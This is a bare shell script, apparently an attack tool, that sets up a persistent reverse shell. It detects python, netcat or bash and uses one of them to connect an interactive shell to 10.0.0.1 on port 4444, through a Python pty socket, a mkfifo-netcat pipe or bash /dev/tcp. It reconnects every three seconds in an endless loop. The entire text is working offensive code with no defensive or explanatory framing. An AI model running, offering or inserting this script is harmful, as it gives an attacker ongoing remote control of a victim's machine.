H=10.0.0.1
P=4444
C="command -v"
PY=$($C python3 || $C python)
NC=$($C nc || $C ncat)
SH=$($C bash || $C sh)
while true; do
  if [ -n "$PY" ]; then
    $PY -c "import socket,os,pty;s=socket.socket();s.connect(('$H',$P));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn('/bin/bash')" 2>/dev/null
  elif [ -n "$NC" ]; then
    F=/tmp/f$$; mkfifo $F; cat $F|$SH -i 2>&1|$NC $H $P >$F; rm $F
  else
    bash -i >& /dev/tcp/$H/$P 0>&1
  fi
  sleep 3
done
